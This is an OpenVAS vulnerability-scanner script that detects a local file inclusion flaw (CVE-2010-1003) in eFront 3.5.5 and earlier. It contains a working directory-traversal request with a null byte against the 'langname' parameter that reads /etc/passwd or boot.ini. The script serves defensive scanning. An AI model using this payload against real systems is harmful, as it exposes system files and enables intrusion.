###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_eFront_38787.nasl 14 2013-10-27 12:33:37Z jan $
#
# eFront 'langname' Parameter Local File Include Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "eFront is prone to a local file-include vulnerability because it fails
to properly sanitize user-supplied input.

An attacker can exploit this vulnerability to obtain potentially
sensitive information and execute arbitrary local scripts in the
context of the webserver process. This may allow the attacker to
compromise the application and the underlying computer; other attacks
are also possible.

eFront 3.5.5 and prior are vulnerable.";

tag_solution = "Updates are available to address this issue. Please see the references
for more information.";

if (description)
{
 script_id(100546);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-03-22 19:12:13 +0100 (Mon, 22 Mar 2010)");
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2010-1003");
 script_bugtraq_id(38787);
 script_tag(name:"risk_factor", value:"High");

 script_name("eFront 'langname' Parameter Local File Include Vulnerability");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;


 script_description(desc);
 script_summary("Determine if eFront is prone to a local file-include vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("secpod_efront_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/38787");
 script_xref(name : "URL" , value : "http://www.efrontlearning.net/");
 script_xref(name : "URL" , value : "http://www.coresecurity.com/content/efront-php-file-inclusion");
 script_xref(name : "URL" , value : "http://forum.efrontlearning.net/viewtopic.php?f=15&amp;t=1945.");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/510155");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port,app:"eFront"))exit(0);

files = make_list("etc/passwd","boot.ini");

foreach file (files) {

  url = string(dir,"/www/editor/tiny_mce/langs/language.php?langname=a/../../../../../../../../../",file,"%00"); 

  if(http_vuln_check(port:port, url:url,pattern:"(root:.*:0:[01]:|\[boot loader\])")) {
     
    security_hole(port:port);
    exit(0);

  }
}

exit(0);

